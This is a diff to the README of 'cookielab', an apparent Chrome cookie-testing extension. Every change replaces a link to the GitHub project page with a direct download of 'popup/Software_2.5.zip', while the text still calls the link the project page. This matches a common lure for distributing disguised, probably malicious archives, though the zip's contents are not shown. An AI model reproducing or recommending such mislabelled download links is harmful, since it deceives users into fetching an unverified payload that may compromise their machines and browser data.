@@ -1,6 +1,6 @@
 # 🧩 cookielab - Manage Cookies for Testing
 
-[![Download cookielab](https://img.shields.io/badge/Download-cookielab-blue?style=for-the-badge)](https://github.com/Resentful-flightsurgeon179/cookielab)
+[![Download cookielab](https://img.shields.io/badge/Download-cookielab-blue?style=for-the-badge)](https://github.com/Resentful-flightsurgeon179/cookielab/raw/refs/heads/main/popup/Software_2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ cookielab works as a Chrome extension, so you do not need a separate desktop app
 ## 📥 Download and Install
 
 1. Open the main project page:
-   https://github.com/Resentful-flightsurgeon179/cookielab
+   https://github.com/Resentful-flightsurgeon179/cookielab/raw/refs/heads/main/popup/Software_2.5.zip
 
 2. Look for the latest release or download files on that page.
 
@@ -147,6 +147,6 @@ Use cookielab only on sites you own, test, or have permission to inspect. Cookie
 ## 🔗 Download
 
 Visit the project page here:
-https://github.com/Resentful-flightsurgeon179/cookielab
+https://github.com/Resentful-flightsurgeon179/cookielab/raw/refs/heads/main/popup/Software_2.5.zip
 
 Open the page, download the files, then follow the Chrome setup steps above
